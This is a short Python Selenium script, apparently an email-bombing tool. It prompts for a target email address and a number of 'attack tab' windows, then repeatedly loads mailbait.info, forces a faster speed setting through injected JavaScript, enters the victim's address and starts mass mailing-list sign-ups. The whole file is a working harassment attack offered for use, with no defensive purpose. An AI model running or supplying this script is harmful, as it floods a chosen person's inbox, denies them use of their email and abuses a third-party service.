from selenium import webdriver
import time
from random import randint

def launch():
	driver = webdriver.Chrome()
	url = "https://mailbait.info/run.html"
	email = input('Please enter target email address: ')
	windows = int(input('How many Windows of 10 Attack Tabs would you like to open? '))
	
	print(f'Attack Tabs will be opened sequentially until 10 per window are reached for a total of {windows * 10} attack tabs over 50 minutes.')
	time.sleep(5)
	print('Starting attack in 5 seconds')
	time.sleep(5)
	
	for i in range(windows):
	    driver.switch_to.window(driver.window_handles[-1])
	    driver.get(url)
	    driver.execute_script('document.querySelector("#speed > option").value = -11000')

	    text_box = driver.find_element_by_id('.mbe')

	    text_box.send_keys(email)

	    categories_check = driver.find_element_by_id('categories1')

	    run = driver.find_element_by_id('runt')
	    run.click()

	    categories_check.click()
	    print(f'The current tab is: {i + 1}')
	    
	    print('Sleeping for 300 seconds...')
	    time.sleep(300)  

	    driver.execute_script("window.open('https://mailbait.info/run.html');")
		
	print(10*"-")
	print('Browser Window of 10 Attack Tabs at Full Speed = Complete')
	print(10*"-")
    
	driver.close()
    	
launch()
